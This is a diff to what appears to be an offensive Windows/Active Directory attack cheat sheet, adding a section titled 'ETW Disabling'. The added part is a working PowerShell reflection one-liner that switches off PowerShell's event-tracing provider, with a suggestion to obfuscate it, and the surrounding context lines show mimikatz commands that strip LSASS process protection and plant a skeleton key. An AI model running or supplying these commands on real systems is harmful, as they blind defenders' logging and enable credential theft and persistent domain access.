@@ -55,6 +55,7 @@ it is the first version of this repo, many things will be added later, so stay t
     - [Just Enough Administration](#just-enough-administration)
     - [ExecutionPolicy](#executionpolicy)
     - [RunAsPPL for Credentials Dumping](#runasppl-for-credentials-dumping)
+    - [ETW Disabling](#etw-disabling)
   - [MS Exchange](#ms-exchange)
     - [OWA, EWS and EAS Password Spraying](#owa-ews-and-eas-password-spraying)
     - [GAL and OAB Extraction](#gal-and-oab-extraction)
@@ -891,6 +892,13 @@ mimikatz # !processprotect /process:lsass.exe /remove
 mimikatz # misc::skeleton
 mimikatz # !-
 ```
+
+### ETW Disabling
+
+```powershell
+[Reflection.Assembly]::LoadWithPartialName('System.Core').GetType('System.Diagnostics.Eventing.EventProvider').GetField('m_enabled','NonPublic,Instance').SetValue([Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider').GetField('etwProvider','NonPublic,Static').GetValue($null),0)
+```
+you can try obfuscation techniques on this command. To learn more about ETW see my course [here]()
 
 
 ## MS Exchange 
